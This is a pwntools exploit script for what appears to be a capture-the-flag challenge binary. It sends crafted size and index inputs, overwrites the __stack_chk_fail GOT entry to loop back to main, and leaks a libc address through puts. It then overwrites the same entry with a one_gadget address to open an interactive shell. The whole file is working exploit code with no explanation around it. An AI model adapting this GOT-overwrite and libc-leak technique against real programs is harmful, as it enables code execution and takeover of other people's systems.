#!/usr/bin/env python2
from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
#context.log_level = "debug"

global io
breakpoints = '''
break *0x4007d6
break *0x40090a
break *0x4008a9
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

main = 0x4007d6
stk_chk = exe.got['__stack_chk_fail']
puts = libc.symbols['_IO_puts']
one_gadget = 0x4f322

reu("size: ")
s("16711571")

reu("idx: ")
s("680664")

reu("where: ")
s(str(stk_chk))
reu(str(stk_chk))
s(p64(main))

reu("puts: ")
leak = int(rl(),16)-puts
log.info("Libc leak -> "+hex(leak))

reu("size: ")
s("16711578")

reu("idx: ")
s("062235")

reu("where: ")
s(str(stk_chk))
reu(str(stk_chk))
s(p64(leak+one_gadget))

io.interactive()